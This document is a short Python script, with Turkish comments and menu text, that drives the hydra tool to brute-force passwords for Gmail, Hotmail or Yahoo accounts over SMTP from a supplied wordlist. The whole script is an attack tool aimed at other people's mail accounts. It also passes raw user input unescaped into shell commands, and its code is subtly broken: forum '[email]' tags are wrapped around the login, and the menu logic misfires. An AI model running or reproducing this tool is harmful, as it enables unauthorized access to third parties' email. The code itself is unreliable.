#CODED by NotBody

"""
Tool hydra ile brute force atmaktadır 
Kali linuxda çalışmaktadır
NotBody tarafından kodlanmıştır


NotBody instagram ;
@NotBodyOfficial

 import cowsay
ModuleNotFoundError: No module named 'cowsay'
hatası ile karşılaşırsanız
apt install cowsay


"""
import cowsay
import os
from os import system
from time import sleep as timeout

os.system("clear")

cowsay.daemon("Mail Brute Force")

banner = """

01)=> GMAİL
02)=> HOTMAİL
03)=> YAHOO
Coded by NotBody
Hydra üzerinden çalışmaktadır!!!!
"""
print(banner)

islem = input("""
┌──(Mail💀Brute)-[Mail Türü]
└─# """)

wordlst = input("""
┌──(Mail💀Brute)-[Word List]
└─# """)

mail = input("""
┌──(Mail💀Brute)-[Mail]
└─# """)

if islem.strip() == "1" or islem.strip() == "01":
    os.system("hydra smtp.gmail.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 465 -S -v -V")

if islem.strip() == "2" or islem.strip() == "02":
    os.system("hydra smtp.live.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")

if islem.strip() == "3" or islem.strip() == "03":
    os.system("hydra smtp.mail.yahoo.com smtp -l [email]"+ mail +"[/email] -P " +wordlst+ " -s 587 -S -v -V")

else :
    print("\nYanlış seçim")
    timeout(1)
    os.system("python3 MailBrute.py")


